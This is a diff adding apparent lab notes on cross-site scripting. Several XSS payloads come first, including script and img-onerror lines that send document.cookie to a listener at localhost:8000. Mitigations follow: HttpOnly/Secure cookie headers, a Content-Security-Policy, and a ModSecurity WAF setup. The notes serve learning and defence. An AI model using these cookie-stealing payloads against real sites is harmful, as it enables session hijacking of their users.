@@ -1,0 +1,36 @@
+<script>alert(document.cookie)</script>
+
+<script>
+document.location="http://localhost:8000?cookie="+document.cookie
+</script>
+
+<img src=x onerror=alert(1)>
+
+<img src=x onerror="document.location='http://localhost:8000?cookie='%2Bdocument.cookie">
+
+
+
+<script src="/blog/filter.js"></script>
+<script src="/blog/filter-secure.js"></script>
+
+
+// HttpOnly/Secure
+sudo a2enmod headers
+sudo apache2ctl configtest
+sudo systemctl restart apache2
+
+
+// CSP
+header("Content-Security-Policy: default-src 'self'; script-src 'self';");
+header("X-Content-Type-Options: nosniff");
+
+
+// WAF
+sudo nano /etc/modsecurity/modsecurity.conf
+sudo apachectl configtest && sudo systemctl restart apache2
+
+sudo nano /etc/apache2/mods-enabled/security2.conf
+IncludeOptional "/usr/share/modsecurity-crs/*.conf"
+IncludeOptional "/usr/share/modsecurity-crs/activated_rules/*.conf"
+
+
